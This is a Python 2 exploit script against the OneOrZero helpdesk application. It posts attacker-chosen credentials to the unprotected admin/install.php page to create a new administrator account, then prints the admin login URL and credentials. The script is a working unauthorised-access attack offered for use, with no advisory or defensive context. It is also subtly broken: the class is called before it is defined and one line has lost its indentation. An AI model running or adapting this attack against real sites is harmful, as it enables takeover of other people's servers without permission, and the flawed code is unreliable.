import urlparse
import httplib
import string

OneOrZero("http://www.target.com","80","NewUserName","NewPassword")


class OneOrZero:
    def __init__(self,target,port,user,password):
        if port != "":
            self.port=str(port)
        else :
            self.port="80"
        self.path=str(urlparse.urlparse(target)[2])
        self.target=str(urlparse.urlparse(target)[1])
        self.user=str(user)
        self.password=str(password)
        self.USER_AGENT='OneOrZero.py'
        self.CreateAdminAccount()

    def CreateAdminAccount(self):


data='step=2&first=admin&last=admin&user='+self.user+'&pwd1='+self.password+'&pwd2='+self.password+'&email=a@a.a&office=abcd'

        try :
            print "Connecting On "+self.target+"...\n"

            http=httplib.HTTP(self.target,self.port)

            print "Sending Data On "+self.target+"...\n"

            http.putrequest("POST",self.path+"/admin/install.php")

	    http.putheader("Content-Type","application/x-www-form-urlencoded")
            http.putheader("User-Agent",self.USER_AGENT)
            http.putheader("Host",self.target)
            http.putheader("Content-Length",str(len(data)))
            http.endheaders()

            http.send(data)

            code,msg,headers = http.getreply()

            print "HTTP Code : ",str(code)
            print "HTTP Connection : ",msg
            print "HTTP headers : \n",headers,"\n"

            file=http.getfile()
            if string.find(file.read(),"Administrator Account Created Successfully.") != -1:
                print "Congratulations, Administrator Account Created Successfully."
                print "You Can Log In Here : http://"+self.target+self.path+"/admin/control.php"
                print "User : ",self.user
                print "Password : ",self.password
            else :
                print "Administrator Account Hasn't Been Created."

        except :
            print "Error During Admin Account Creation."

